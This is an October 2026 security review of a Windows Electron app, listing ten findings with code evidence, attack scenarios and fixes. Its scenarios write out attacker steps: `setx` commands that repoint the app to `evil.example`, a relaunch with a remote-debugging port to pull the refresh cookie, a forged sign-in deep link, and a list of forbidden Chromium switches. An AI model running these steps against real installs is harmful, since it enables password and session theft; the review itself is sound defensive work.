# What to fix — Tutornote-windows-app

Security review, October 2026. Branch `vulnerability_october_vulnerability`, cut from `feature/october` at `43a6895`.

This file lists every vulnerability found in this repository and what to change to fix it. It was written
**before** any fix, so it describes the code as it stands at `43a6895`. The fixes follow on this same branch;
each fix commit names the IDs it closes, and the Status column below is updated as they land.

**10 findings: 1 Medium, 9 Low.**

How to read a finding:
- **Severity:** how bad it is if exploited, given what is reachable today.
- **Confidence:** `confirmed` means it was traced or reproduced in the code; `likely` means the code path is
  there but one condition (a live setting, a browser behaviour) could not be checked from the repository.
- **Evidence** quotes the code; secret values are never reproduced, only their first characters.

## At a glance

| ID | Severity | Category | What | Status |
|---|---|---|---|---|
| WIN-01 | Medium | Update | Unsigned installer, no update channel: no release integrity and no security updates | Open |
| WIN-02 | Low | Other (trust boundary / configuration) | Launch environment variables repoint the trusted origin in packaged builds | Open |
| WIN-03 | Low | Electron hardening | Chromium debugging and network switches are honoured; fuses do not cover them | Open |
| WIN-04 | Low | Navigation | A sign-in "round trip" lets any HTTPS host reached by redirect load in the app window, with the preload | Open |
| WIN-05 | Low | Electron hardening | `grantFileProtocolExtraPrivileges` stays on; the app's own file:// screens have weak or no CSP | Open |
| WIN-06 | Low | Deep link | Any website can cancel an in-progress browser sign-in and pop the app or dialogs through `tutornote://auth/…` | Open |
| WIN-07 | Low | Electron hardening | Microphone granted to the app origin with no prompt; CSP lets a third-party script host into that origin | Open |
| WIN-08 | Low | Info leak | One-time sign-in secrets in logs; account data left on disk after uninstall | Open |
| WIN-09 | Low | Hard-coded secret (information, not a credential) | Internal test server address in source | Open |
| WIN-10 | Low | CVE | npm audit advisories are build-toolchain only; Electron 44.9.3 has none | Open |

Branch `vulnerability_october_vulnerability` (HEAD 43a6895, cut from `feature/october`). Reviewed: `src/main/*`, `src/preload/*`, `static/*`, `electron-builder.config.cjs`, `scripts/*`, `package.json`/lockfile, full git history (`git log --all -p`). Most of `src/` is identical to the Mac repo (only `auth.ts`, `index.ts`, `updater.ts`, `windows.ts`, `companion.ts`, `static/toolbar.html` differ, and those diffs are mostly UI). `npm test`: 91/91 passing. Typecheck not run (no `node_modules`).

## Summary
The Electron baseline is solid. Every BrowserWindow and WebContentsView has `contextIsolation: true, sandbox: true, nodeIntegration: false`. `<webview>` is blocked. `shell.openExternal` only takes `http(s):`/`mailto:` (`links.ts:5`). IPC handlers check who is calling: `trusted()` for auth, the app origin for speech, and `fromLesson`/`fromBlob`/`fromPanel`/`fromOverlay` for the native features. Permissions are limited to the app's origin and HID/serial/USB/Bluetooth are refused. The browser sign-in uses `state` plus PKCE, and the web side requires an explicit "Continue as…" click and an allowlisted scheme. The fuses turn off RunAsNode, NODE_OPTIONS and `--inspect`, and cookies are encrypted with DPAPI. The `app://` handler is safe against path traversal. No certificate-error overrides and no header stripping were found, and there are no secrets in git history.

I found no path from a remote attacker to code execution or to stealing the session. The worst issue is release integrity: the installer is unsigned, users are told to click past SmartScreen, and there is no update channel, so Chromium and Electron fixes never reach installed copies (WIN-01). The other issues are defence-in-depth gaps, or need a same-user foothold, which is not a privilege boundary on Windows:
- the launch environment and Chromium switches can repoint or instrument the app (WIN-02/03);
- a sign-in round trip lets any HTTPS host load inside the app window (WIN-04);
- the file:// extra-privileges fuse is still on (WIN-05).

## Attack chains
1. **Fake installer becomes the real app (WIN-01, WIN-08).** The genuine `Tutornote-Setup-x.exe` is unsigned and users are told to click "More info → Run anyway", so a look-alike installer (phishing mail, SEO, typo-squatted download page) looks no different. Once installed it is the user's "Tutornote". Because there is no update channel, an install that does get infected, or that is just old, keeps running an outdated Chromium indefinitely. The `asar` integrity fuse is no defence here, since the exe that holds the integrity hash is not signed either.
2. **Persistent repoint, then silent microphone and password capture (WIN-02 + WIN-07).** A same-user process runs `setx ANOTHERNOTES_SITE 1` and `setx ANOTHERNOTES_URL https://evil.example` (HKCU, no admin). Every later Start-menu launch then treats `https://evil.example` as `APP_ORIGIN`. That origin gets the microphone with no prompt (`index.ts:143`) and the trusted `window.anothernotes.auth.*` bridge, and the app's own sign-in screen POSTs the password to `evil.example/api/auth/login` (`signin.ts:58`). The user sees the normal Tutornote window, with no address bar.
3. **Debug port, then cookie theft, then account takeover (WIN-03).** Launch with `--remote-debugging-port=9222`, attach over CDP, and read the decrypted `an_refresh` cookie (`Storage.getCookies`) or run JS in `app://anothernotes`. The refresh cookie can then be replayed against `/api/auth/refresh` from anywhere.
4. **Backend open redirect, then phishing inside the app (WIN-04).** If `/api/auth/*` or `/api/sources/*` ever gains an open redirect (none found today), a link to `app://anothernotes/api/auth/...` turns on "round trip" mode. Any HTTPS page reached by redirect then renders in the app window, with no address bar and with the preload loaded. It can draw a pixel-perfect fake sign-in and call the unchecked `nav:open`/`chrome:layout` IPC.

## Findings

### WIN-01 — Unsigned installer, no update channel: no release integrity and no security updates
- Severity: Medium
- Category: Update
- Location: `electron-builder.config.cjs:11-15`, `:43`, `:53`, `:54-68`; `src/main/updater.ts:12-22`, `:72-81`
- Confidence: confirmed
- Evidence:
  ```
  // electron-builder.config.cjs:11-14
  Not signed yet, and no update feed yet ... Until then Windows shows
  "Windows protected your PC" on first run (More info, Run anyway), and updates are a new
  installer run over the old one.
  // :53
  publish: null,
  // updater.ts:18,22
  const NO_FEED = process.platform === "win32";
  if (!app.isPackaged || NO_FEED) return;
  ```
- Attack scenario:
  - A malicious website or email serves a trojanised `Tutornote-Setup-0.1.1.exe`. The user cannot tell it from the real one: neither has a publisher, and the docs tell users to override SmartScreen.
  - Separately, every installed copy keeps the Electron/Chromium it shipped with until the user happens to run a new installer, so later renderer exploits stay exploitable.
  - Because the installer is per-user (`perMachine: false`, `%LOCALAPPDATA%\Programs\Tutornote`) and the exe is unsigned, `enableEmbeddedAsarIntegrityValidation` (`:43`) protects nothing against tampering: the integrity hash lives in the unsigned exe.
- Fix:
  - Sign the NSIS installer and the app exe. Use electron-builder `win.signtoolOptions`/`azureSignOptions` with an OV/EV certificate or Azure Trusted Signing, and set `win.signtoolOptions.publisherName`.
  - Add an update feed:
    - Use a public HTTPS bucket or a generic/GitHub provider; private repos are not required.
    - In `updater.ts`, remove `NO_FEED` and leave electron-updater's Windows signature verification on: `verifyUpdateCodeSignature` is the default once `publisherName` is set.
    - Do not set `disableWebInstaller`/`allowDowngrade`.
  - Until then, publish SHA-256 hashes of each installer on an HTTPS page users can check.

### WIN-02 — Launch environment variables repoint the trusted origin in packaged builds
- Severity: Low (needs a same-user foothold; on the Mac build the same code is Medium, see MAC-02)
- Category: Other (trust boundary / configuration)
- Location:
  - `src/main/config.ts:11-21`, `:48-51`, `:57-67`, `:86`
  - `src/main/index.ts:132-145`, `:200-203`
  - `src/main/signin.ts:58`
  - `src/main/speech.ts:304-308`
  - `src/main/companion.ts:1010`
- Confidence: confirmed (code). The `setx` persistence is standard Windows behaviour.
- Evidence:
  ```
  // config.ts:12-15
  const override = process.env.ANOTHERNOTES_URL;
  if (override) { try { return new URL(override); } ...
  // config.ts:48-49
  export const BUNDLED = process.env.ANOTHERNOTES_SITE !== "1" && existsSync(...);
  export const APP_ORIGIN = BUNDLED ? `${APP_SCHEME}://anothernotes` : SITE_ORIGIN;
  // config.ts:58
  const override = process.env.ANOTHERNOTES_API_URL;
  ```
  Nothing checks `app.isPackaged`. `http:` is accepted.
- Attack scenario:
  - A same-user process (a malicious npm package, a dropper) runs `setx ANOTHERNOTES_SITE 1 & setx ANOTHERNOTES_URL https://evil.example`.
  - From then on, every launch from Start or the desktop loads `https://evil.example` as `APP_ORIGIN`. That origin:
    - gets `media` permission with no prompt (`index.ts:143`);
    - passes `trusted()` for `auth:*` (`index.ts:200-203`);
    - gets the genuine app's sign-in screen sending typed passwords to `evil.example/api/auth/login` (`signin.ts:58`).
  - With only `ANOTHERNOTES_API_URL` set, all API traffic goes to the attacker, including the top-level `/api/auth/desktop/exchange` navigation. The proxy (`renderer.ts:133-190`) passes the attacker's headers through, so a CSP-less HTML response runs script in `app://anothernotes`.
  - `TUTORNOTE_TAP_LOG=1` (`companion.ts:1010`) is also honoured in packaged builds. It is unreachable on Windows today (no screen helper).
- Fix: in `config.ts`, read `ANOTHERNOTES_URL`, `ANOTHERNOTES_API_URL`, `ANOTHERNOTES_SITE` and `ANOTHERNOTES_PREVIEW_KEY` only when `!app.isPackaged`. For example, `const DEV = !app.isPackaged;` and `const override = DEV ? process.env.ANOTHERNOTES_URL : undefined;`. Refuse non-`https:` URLs except `localhost`. Do the same for `TUTORNOTE_TAP_LOG` in `companion.ts:1010`. If testers need a test server in a packaged build, use a signed build flavour or a visible in-app setting that shows a permanent "Connected to <host>" banner (the sign-in screen already has `#server`).

### WIN-03 — Chromium debugging and network switches are honoured; fuses do not cover them
- Severity: Low (same-user only on Windows; DPAPI already lets same-user code decrypt cookies)
- Category: Electron hardening
- Location: `src/main/index.ts:39-58` (no command-line check); `electron-builder.config.cjs:38-46`
- Confidence: likely. To confirm, launch `Tutornote.exe --remote-debugging-port=9222` and open `http://127.0.0.1:9222/json`.
- Evidence:
  ```
  // electron-builder.config.cjs:38-46
  electronFuses: { runAsNode: false, enableCookieEncryption: true,
    enableNodeOptionsEnvironmentVariable: false, enableNodeCliInspectArguments: false, ... }
  ```
  No fuse disables `--remote-debugging-port`/`--remote-debugging-pipe`, `--proxy-server`, `--host-resolver-rules` or `--ignore-certificate-errors`, and `index.ts` never inspects `app.commandLine`. (Deep-link argv is safe: Electron aborts when a switch follows a URL argument.)
- Attack scenario:
  - A same-user process kills Tutornote and relaunches it with `--remote-debugging-port=9222`.
  - Over CDP it runs JS in the `app://anothernotes` page (bridge, silent mic per WIN-07) and calls `Storage.getCookies` to get the `an_refresh` refresh cookie in plaintext. That gives a persistent account session elsewhere.
  - Alternatively, `--proxy-server=… --ignore-certificate-errors` MITMs the app's API traffic.
- Fix: as the very first statements of `src/main/index.ts`, before `registerAppScheme()`:
  ```ts
  const FORBIDDEN = ["remote-debugging-port","remote-debugging-pipe","remote-debugging-address","remote-allow-origins",
    "inspect","inspect-brk","inspect-port","js-flags","proxy-server","proxy-pac-url","host-rules","host-resolver-rules",
    "ignore-certificate-errors","ignore-certificate-errors-spki-list","disable-web-security","user-data-dir",
    "renderer-cmd-prefix","gpu-launcher","utility-cmd-prefix","browser-subprocess-path"];
  if (app.isPackaged && FORBIDDEN.some((s) => app.commandLine.hasSwitch(s))) { app.exit(1); }
  ```

### WIN-04 — A sign-in "round trip" lets any HTTPS host reached by redirect load in the app window, with the preload
- Severity: Low
- Category: Navigation
- Location:
  - `src/main/windows.ts:195`, `:307-314`, `:1527-1561`
  - `src/preload/index.ts:290-309`, `:839-844`
  - `src/main/windows.ts:1435-1449` (`nav:open`), `:1414-1432` (`chrome:layout`)
- Confidence: confirmed (code path). Exploitation needs an open redirect behind `/api/auth/` or `/api/sources/`. I checked `tutornote-backend` (`identity/accounts/sso.py` `safe_next`, `_begin`; `SamlStartView` never redirects) and found none.
- Evidence:
  ```
  // windows.ts:195
  const ROUND_TRIP_PREFIXES = ["/api/auth/", "/api/sources/"];
  // windows.ts:1552-1556
  // a provider's page on the way back to the app
  if (roundTrip && /^https:/i.test(url) && (redirect || tripHosts.has(host))) {
    tripHosts.add(host);
    return;
  }
  ```
  The preload exposes `window.anothernotes` and installs link routing on any `http(s):` page (`preload/index.ts:839`). `nav:open` and `chrome:layout` check only that the sender is one of the window's pages, not its URL.
- Attack scenario:
  - A link in content the student opens points to `app://anothernotes/api/auth/<route>` and redirects to `https://evil.example`.
  - `will-redirect` lets any HTTPS host through, and the page then stays in the app window with no address bar. It can draw a fake "session expired, sign in" form, and call `nav:open` to steer tabs and `chrome:layout` to restyle the tab bar.
  - The auth, speech and screen-teach IPC stays closed: those handlers check the origin.
  - Today this needs a backend open redirect or a compromised identity provider page.
- Fix:
  - In `guard` (`windows.ts:1527`), replace "any https host on redirect" with an allowlist of identity and source providers: `appleid.apple.com`, `login.microsoftonline.com`, `accounts.google.com` (already refused), Google Drive consent hosts. Any other host gets `preventDefault()` and `openExternal`.
  - In `preload/index.ts`, expose the bridge and send `nav:open`/`chrome:layout` only when `location.origin` is the app origin (`app:`) or a `file:` page under `static/`.
  - In `windows.ts:1414` and `:1435`, also require `isAppUrl(event.senderFrame?.url ?? "")`.

### WIN-05 — `grantFileProtocolExtraPrivileges` stays on; the app's own file:// screens have weak or no CSP
- Severity: Low
- Category: Electron hardening
- Location: `electron-builder.config.cjs:45`; `static/offline.html:34-46` (no CSP); `static/signin.html:7`; `src/main/index.ts:199-203`
- Confidence: confirmed (configuration). No current injection path was found.
- Evidence:
  ```
  // electron-builder.config.cjs:45
  grantFileProtocolExtraPrivileges: true,
  // static/offline.html:37,42  (no <meta http-equiv="Content-Security-Policy">)
  var url = q.get("url") || "https://tutornote.ai/dashboard";
  var retry = function () { location.href = url; };
  // static/signin.html:7
  ... img-src data: file: https:; media-src file: http: https:
  ```
- Attack scenario:
  - With the fuse on, any script running in one of the app's file:// pages (sign-in, offline, toolbar) can `fetch('file:///C:/Users/<u>/...')` and read local files.
  - `offline.html` would run a `javascript:` URL from its `url` query parameter. Today only the main process loads it, with an `isAppUrl`-filtered URL (`windows.ts:1732-1736`), and page navigations to `file:` are refused (`guard`).
  - So this is one bug away from local file disclosure, not exploitable on its own.
- Fix:
  - Serve `static/` through a privileged custom scheme of its own, for example `protocol.handle("tutornote-ui", …)` with `standard: true, secure: true`, path-checked like `renderer.ts:110-120`, and not under `APP_ORIGIN`.
  - Switch `loadFile(...)` calls to `loadURL("tutornote-ui://ui/<page>.html")`.
  - Change `trusted()` (`index.ts:199-202`) to match that origin.
  - Set `grantFileProtocolExtraPrivileges: false`.
  - Meanwhile, add `<meta http-equiv="Content-Security-Policy" content="default-src 'none'; style-src 'unsafe-inline'; script-src 'unsafe-inline'">` to `offline.html`, and in its script only follow `url` when it matches `/^(app|https):\/\//`.

### WIN-06 — Any website can cancel an in-progress browser sign-in and pop the app or dialogs through `tutornote://auth/…`
- Severity: Low
- Category: Deep link
- Location: `src/main/auth.ts:106-122`, `:138-167`; `src/main/index.ts:61-72`
- Confidence: confirmed
- Evidence:
  ```
  // auth.ts:108-109, 119
  const current = pending;
  pending = null;            // consumed before the state is compared
  ...
  if (state !== current.state) {
  // auth.ts:154 (after a rejected link)
  if (new URL(raw).hostname !== "auth") return;   // then shows "That sign-in link has expired"
  ```
- Attack scenario:
  - While a student is signing in through the browser (a 10-minute window), any page they visit can fire `tutornote://auth/callback?code=AAAAAAAAAAAAAAAA&state=x`, after the browser's "Open Tutornote?" prompt.
  - The genuine sign-in is then thrown away ("expired" dialog), and the app is raised and focused.
  - Repeated links spam the window and the sign-in log, which is size-capped.
  - It cannot sign the user in to another account: `state` and PKCE hold.
  - A malformed link such as `tutornote://%` makes `new URL(raw)` throw in `handleDeepLink`. It is caught only by the global `uncaughtException` logger.
- Fix:
  - In `exchangeUrlFor`, compare `state` with `current.state` before clearing `pending`, and clear it only on a match or on expiry: `if (!current || state !== current.state) return null; pending = null;`.
  - In `handleDeepLink`, parse once in a `try`, and show the dialog only when a sign-in was actually pending.
  - Rate-limit `focusMainWindow()` from deep links.

### WIN-07 — Microphone granted to the app origin with no prompt; CSP lets a third-party script host into that origin
- Severity: Low
- Category: Electron hardening
- Location: `src/main/index.ts:136-145`; `src/main/renderer.ts:53-66`
- Confidence: confirmed
- Evidence:
  ```
  // index.ts:136-143
  if (permission === "media") {
    ... if (process.platform === "darwin") { ...askForMediaAccess... }
    return callback(true);           // Windows: granted silently
  }
  // renderer.ts:55
  "script-src 'self' 'wasm-unsafe-eval' https://challenges.cloudflare.com",
  ```
- Attack scenario:
  - In a browser the site gets a per-origin microphone prompt. In the Windows app, any script that runs in `app://anothernotes` can start recording silently. That could be an XSS in the bundled web app, a compromised build dependency (WIN-02, chain 2), or a script from `challenges.cloudflare.com`, which the CSP allows even though the desktop build is `build:off` (Turnstile off).
  - Windows desktop apps have no per-app microphone consent, so only the taskbar mic icon shows.
- Fix:
  - In `index.ts`, on first `media` request show a one-time `dialog.showMessageBox` consent ("Allow Tutornote to use your microphone?") and store the answer in `userData`. Also require `details.isMainFrame` (or check `contents` is a page from `windows.ts`).
  - In `renderer.ts:55-60`, drop `https://challenges.cloudflare.com` from `script-src`, `frame-src` and `connect-src` for the desktop bundle.

### WIN-08 — One-time sign-in secrets in logs; account data left on disk after uninstall
- Severity: Low
- Category: Info leak
- Location:
  - `src/main/windows.ts:301-305`, `:1618-1620`, `:1637-1642`
  - `src/main/index.ts:182-187`
  - `src/main/auth.ts:129-134`
  - `electron-builder.config.cjs:67`
  - `static/signin.html:476`
- Confidence: confirmed
- Evidence:
  ```
  // windows.ts:302-304: strips only the #fragment
  const forLog = (url) => { const hash = url.indexOf("#"); return hash < 0 ? url : `${url.slice(0, hash)}#…`; };
  // windows.ts:1620
  if (shown(page)) console.log(`[anothernotes] loading ${forLog(details.url)}`);
  // auth.ts:130-132: the exchange URL carries the code and the PKCE verifier in the query
  exchange.searchParams.set("code", code); ... set("code_verifier", current.verifier);
  // index.ts:186 (site mode)
  console.log(`[anothernotes] GET ${details.url} gateKey=...`);
  // electron-builder.config.cjs:67
  deleteAppDataOnUninstall: false,
  ```
- Attack scenario:
  - When a browser sign-in finishes while the app is already showing pages (the `loadHome` path), stdout gets `…/api/auth/desktop/exchange?code=…&state=…&code_verifier=…`. In site mode, `onBeforeSendHeaders` logs the same.
  - Both values are single-use and spent at once, so the exposure is small. It does undo the "never a code, a state or the secret" promise in `auth.ts:28-30` for anyone capturing stdout (support logs, `npm start` transcripts).
  - Uninstalling leaves `%APPDATA%\Tutornote` with the DPAPI-encrypted cookie store, which holds a still-valid `an_refresh`. It also leaves `logs\sign-in.log` and the last email in the file:// page's localStorage (`signin.html:476`).
  - Mitigated: the file-backed sign-in log (`auth.ts:55-66`) records only events, never code, state or verifier.
- Fix:
  - Make `forLog` drop the query as well (`new URL(u).origin + new URL(u).pathname`) and use it in `index.ts:186`.
  - Set `deleteAppDataOnUninstall: true`, or at least have the uninstaller and sign-out call `session.defaultSession.clearStorageData({ storages: ["cookies"] })`.
  - Only remember the email if the user opts in.

### WIN-09 — Internal test server address in source
- Severity: Low
- Category: Hard-coded secret (information, not a credential)
- Location: `src/main/config.ts:7`; `.gitignore` (no `*.p12`/`*.pfx`/`*.pem` entries)
- Confidence: confirmed
- Evidence: `* server or a local build (http://100.49.…/, http://localhost:8080).`
- Attack scenario: Names a plain-HTTP public test host (`100.49…`) that answers as the Tutornote API. It may run older or debug builds and is worth an attacker's look. No credentials, tokens, signing passwords, Apple IDs or keys appear anywhere in the tree or in `git log --all -p` (I checked for GitHub, AWS, Google and OpenAI token patterns, JWTs, PEM keys and `.env`/`.p12` files).
- Fix: replace the IP with a placeholder (`http://<test-server>/`). Add `*.p12`, `*.pfx`, `*.pem`, `*.key` to `.gitignore` before a code-signing certificate arrives for WIN-01.

### WIN-10 — npm audit advisories are build-toolchain only; Electron 44.9.3 has none
- Severity: Low (informational)
- Category: CVE
- Location: `package-lock.json` (`node_modules/undici`, `node_modules/node-gyp/node_modules/undici`, `node_modules/http-cache-semantics`, `node_modules/fast-uri`)
- Confidence: confirmed
- Evidence:
  - `npm audit --package-lock-only` reports 3 (2 high, 1 moderate):
    - `undici` 7.30.0, via `electron` → `@electron/get` 5.1.0;
    - `undici` 6.29.0, via `electron-builder` → `@electron/rebuild` → `node-gyp`;
    - `http-cache-semantics` 4.2.0, via `@electron/get` 3.1.0 → `got`;
    - `fast-uri` 3.1.8, via `app-builder-lib` → `ajv`.
  - `npm audit --omit=dev` finds **0**.
  - The packaged `files` are `dist/**`, `static/**`, `renderer/**`, `package.json` plus the prod dependency `electron-updater`@6.8.9 (its tree: `builder-util-runtime`, `js-yaml`, `semver`, etc.). None of the advisories ship in `app.asar`.
  - npm audit lists no advisory for `electron@44.9.3`.
- Attack scenario: Only the build machine is exposed: undici's TLS-option-dropping and redirect cache bugs while Electron and electron-builder download artifacts.
- Fix: run `npm audit fix` (in-range updates exist) and keep Electron on the latest 44.x patch. Once WIN-01 exists, the update feed is what actually delivers those patches.
